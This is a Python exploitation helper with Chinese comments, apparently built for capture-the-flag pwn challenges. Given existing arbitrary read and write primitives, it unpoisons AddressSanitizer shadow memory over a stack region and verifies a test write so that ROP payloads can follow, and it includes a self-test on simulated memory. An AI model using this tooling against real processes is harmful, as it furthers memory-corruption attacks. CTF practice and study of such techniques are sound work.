#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""pwn_stack_probe.py — "解封 shadow → 写真实栈" 的验证模板（团队资产）。

用途（clean-room 五轮实测结论）：拿到「任意 8 字节写 + 任意读」后，最后一步通常是
"绕过 ASan 对目标地址（真实栈/全局）的 shadow 保护，再写 ROP/数据"。这个模板把
「查 shadow → 生成解封写 → 应用 → 复核 → 试写并读回」固化成可复用流程，避免每轮重写。

用法（把题目自己的 read8/write8 原语接进来）：

    from pwn_stack_probe import StackProbe
    from exploit_a import Svc              # 上一轮留下的原语脚本

    svc = Svc(host, port)                  # 题目自己的连接/原语封装
    probe = StackProbe(read8=svc.read8, write8=svc.write8)
    probe.explain()
    report = probe.probe(stack_addr, size=64)     # 返回 dict，含每步断言
    if report["wrote"] and report["verified"]:
        print("shadow 解封 + 写真实栈 成功 → 可以构造 ROP/调用链了")
    svc.close()

也可以直接跑 `python3 pwn_stack_probe.py` 看自检（用模拟内存，不连靶）。
"""
from __future__ import annotations

import sys

from asan_shadow import (ASAN_SHADOW_OFFSET, classify, explain as shadow_explain,
                         shadow_addr, shadow_span, unpoison_plan)


class StackProbe:
    def __init__(self, read8, write8, log=print) -> None:
        """read8(addr)->int / write8(addr, value) 用题目自己的原语；log 默认打印。"""
        self.read8 = read8
        self.write8 = write8
        self.log = log
        self.history: list[dict] = []

    # ---- shadow 读取 ----
    def shadow_group(self, addr: int) -> tuple[int, int]:
        """返回 (shadow 组地址, 该组 8 字节原值)。"""
        group = shadow_addr(addr) & ~7
        return group, int(self.read8(group)) & 0xFFFFFFFFFFFFFFFF

    def shadow_bytes(self, addr: int, size: int) -> list[tuple[int, int]]:
        """返回 [(地址, shadow 字节)]，逐字节给出可访问性依据。"""
        out = []
        for cur in range(addr, addr + size):
            group, word = self.shadow_group(cur)
            idx = (cur >> 3) & 7
            out.append((cur, (word >> (8 * idx)) & 0xFF))
        return out

    def shadow_summary(self, addr: int, size: int) -> dict:
        items = self.shadow_bytes(addr, size)
        groups = {}
        for a, b in items:
            groups.setdefault((a >> 3) & ~7, []).append(b)
        return {"range": (hex(addr), hex(addr + size)),
                "bytes": [(hex(a), classify(b)) for a, b in items],
                "poisoned_groups": [hex(g) for g, bs in groups.items() if any(bs)]}

    # ---- 解封 ----
    def unpoison(self, addr: int, size: int) -> dict:
        plan = unpoison_plan(addr, size, read8=self.read8)
        before = [(g, v) for g, v in plan.restore]
        applied = []
        for group, value in plan.writes:
            self.write8(group, value)
            applied.append((hex(group), hex(value)))
        report = {"plan": repr(plan), "writes": applied, "before": [(hex(g), hex(v)) for g, v in before]}
        self.log(f"[probe] 解封 {size} 字节（{hex(addr)} 起）：{len(applied)} 组 shadow 写")
        for item in applied:
            self.log(f"        write8({item[0]}, {item[1]})")
        self.history.append(report)
        return report

    def verify_unpoisoned(self, addr: int, size: int) -> bool:
        bad = [(hex(a), classify(b)) for a, b in self.shadow_bytes(addr, size) if b != 0]
        self.log(f"[probe] 解封复核：{'OK（全部 0）' if not bad else '仍有 poison: ' + str(bad)}")
        return not bad

    def try_write(self, addr: int, value: int = 0x4142434445464748) -> bool:
        """写 8 字节再读回，验证目标地址真的可写。"""
        try:
            self.write8(addr, value)
            back = int(self.read8(addr)) & 0xFFFFFFFFFFFFFFFF
        except Exception as exc:  # noqa: BLE001
            self.log(f"[probe] 试写 {hex(addr)} 抛异常：{type(exc).__name__}: {exc}")
            return False
        ok = back == (value & 0xFFFFFFFFFFFFFFFF)
        self.log(f"[probe] 试写 {hex(addr)} = {hex(value)} → 读回 {hex(back)}：{'成功' if ok else '失败'}")
        return ok

    # ---- 完整流程 ----
    def probe(self, addr: int, size: int = 64, marker: int = 0x4142434445464748) -> dict:
        before = self.shadow_summary(addr, size)
        self.log(f"[probe] 目标 {hex(addr)}..{hex(addr + size)} 当前 poison 组：{before['poisoned_groups']}")
        plan = {"unpoison": self.unpoison(addr, size)}
        verified = self.verify_unpoisoned(addr, size)
        wrote = self.try_write(addr, marker) if verified else False
        result = {"addr": hex(addr), "size": size, "before": before, **plan,
                  "verified": verified, "wrote": wrote}
        self.log(f"[probe] 结果：verified={verified} wrote={wrote}")
        return result

    def explain(self) -> None:
        self.log(shadow_explain())


def _selftest() -> int:
    """用模拟内存验证流程（不连靶）：poison 一个栈地址的 shadow，解封后写读回。"""
    mem: dict[int, int] = {}

    def read8(addr: int) -> int:
        return mem.get(addr, 0)

    def write8(addr: int, value: int) -> None:
        mem[addr] = value & 0xFFFFFFFFFFFFFFFF

    stack_addr = 0x7FFD0000
    # 模拟：该地址 64 字节被 poison（shadow 组 = (addr>>3)&~7，组内对应字节 0xFA）
    group = shadow_addr(stack_addr) & ~7
    word = 0
    idx = (stack_addr >> 3) & 7
    word |= 0xFA << (8 * idx)
    mem[group] = word
    # 目标地址读回也模拟（方便 try_write 失败/成功）
    mem[stack_addr] = 0

    probe = StackProbe(read8, write8, log=lambda *a: None)
    result = probe.probe(stack_addr, size=64)
    assert result["before"]["poisoned_groups"], result
    assert result["verified"], result
    assert result["wrote"], result
    # 非对齐 + 跨 64 字节边界
    mem2: dict[int, int] = {}
    probe2 = StackProbe(lambda a: mem2.get(a, 0),
                        lambda a, v: mem2.__setitem__(a, v & 0xFFFFFFFFFFFFFFFF),
                        log=lambda *a: None)
    target = 0x7FFD0037
    g = shadow_addr(target) & ~7
    mem2[g] = 0xFAFAFAFAFAFAFAFA
    mem2[g + 8] = 0xFAFAFAFAFAFAFAFA
    res2 = probe2.probe(target, size=48)
    assert res2["verified"] and res2["wrote"], res2
    print("pwn_stack_probe selftest OK")
    print(shadow_explain())
    return 0


def main(argv=None) -> int:
    if argv is None:
        argv = sys.argv[1:]
    if argv and argv[0] in ("-h", "--help"):
        print(__doc__)
        return 0
    return _selftest()


if __name__ == "__main__":
    raise SystemExit(main())